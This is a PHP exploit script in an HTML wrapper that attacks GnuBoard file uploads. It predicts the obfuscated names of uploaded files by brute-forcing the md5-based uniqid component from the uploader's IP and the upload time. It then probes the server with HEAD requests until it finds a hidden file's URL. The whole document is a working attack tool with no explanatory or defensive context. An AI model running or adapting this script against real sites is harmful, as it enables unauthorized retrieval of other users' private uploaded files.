<html>
<head>
<title>test</title>
</head>
<body>
<xmp>

<?
////////////////////////////////////////////////////////////////////////////////
//http://www.example.com/GnuBoard/data/file/happy/747682804_462b38f4_1.jpg

$t_host = "www.example.com";	//target host
$t_dir = "/GnuBoard/data/file/happy/"; //upload directory
$encodedimgname = "747682804_462b38f4_1.jpg";	//Encoded Image file name
$imgname = "1.jpg";	//Upload img file name
$fname = "test.txt";	//Upload wanted file name
$year = "2009";	//file upload time 2009-01-30 08:35:49
$mon = "01";
$day = "30";
$hour = "08";
$min = "35";
$sec = "49";
$ip = $_SERVER[REMOTE_ADDR];	//Attacker IP
/////////////////////////////////////////////////////////////////////////////////

$longip = abs(ip2long($ip));
$encfname = urlencode($fname);
$encimgname = urlencode($imgname);
$time = mktime ($hour, $min, $sec, $mon, $day, $year); 
$prefix = $time;
$_date = date ("Y m j g i a s", $time);

echo "IP : $ip\n";
echo "Wanted File : $encfname\n";
echo "Img File : $encimgname\n";
echo "time : $_date\n";
echo "dir : ".$t_host.$t_dir."\n";

ob_flush();
flush();
?>

<?
for($i = 0; $i < 0x100000; $i++)	//Find img upload time
{
	$uniq_id = sprintf("%s%08x%05x",$prefix,$time,$i);
	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encimgname;

	if(stristr($fullname,$encodedimgname))
	{
		$img_time = $i;
		break;
	}

}

echo "Image file upload usec : $img_time\n";
ob_flush();
flush();

?>
<?

for($i = $img_time; $i < 0x100000; $i++)	//Find wanted upload time
{
	$uniq_id = sprintf("%s%08x%05x",$prefix,$time,$i);
	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encfname;
	
	$ret = myGet($t_host, $t_dir.$fullname);	

	if(stristr($ret,"200 OK"))
	{
		echo "200 OK :) URL : http://".$t_host.$t_dir.$fullname."\n";
		exit();
	}


}

echo "404 Not Found :(\n";


 function myGet($host, $target, $port = 80)
 {

  $request  = "HEAD $target HTTP/1.1\r\n";
  $request .= "Host: $host\r\n";
  $request .= "User-Agent: Mozilla/4.0\r\n";
  $request .= "Accept: text/html\r\n";
  $request .= "Connection: close\r\n";
  $request .= "\r\n";

  $socket  = fsockopen($host, $port, $errno, $errstr, 100);
  fputs($socket, $request);
  $ret = "";
  while(!feof($socket))
   $ret .= fgets( $socket, 4096 );

  fclose( $socket );

  return $ret;
 }

?>
</xmp>
</body>
</html>
